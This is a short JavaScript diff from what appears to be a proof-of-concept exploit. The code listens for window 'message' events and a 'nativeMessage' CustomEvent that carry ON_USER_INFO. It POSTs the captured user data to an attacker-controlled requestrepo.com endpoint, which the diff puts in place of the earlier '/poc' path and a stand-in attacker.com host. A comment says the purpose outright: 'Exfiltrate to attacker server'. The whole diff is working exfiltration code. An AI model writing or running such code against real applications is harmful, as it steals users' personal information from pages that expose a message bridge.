@@ -15,7 +15,7 @@ window.addEventListener('message', function(e) {
   var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
   if (data.event === 'ON_USER_INFO') {
     // Exfiltrate to attacker server
-    fetch('http://9liv9n84.requestrepo.com/poc', {
+    fetch('http://9liv9n84.requestrepo.com/collect', {
       method: 'POST',
       body: JSON.stringify(data.data)
     });
@@ -25,7 +25,7 @@ window.addEventListener('message', function(e) {
 // Also listen for CustomEvent (second dispatch path)
 window.addEventListener('nativeMessage', function(e) {
   if (e.detail && e.detail.event === 'ON_USER_INFO') {
-    fetch('https://attacker.com/collect', {
+    fetch('http://9liv9n84.requestrepo.com/collect', {
       method: 'POST',
       body: JSON.stringify(e.detail.data)
     });
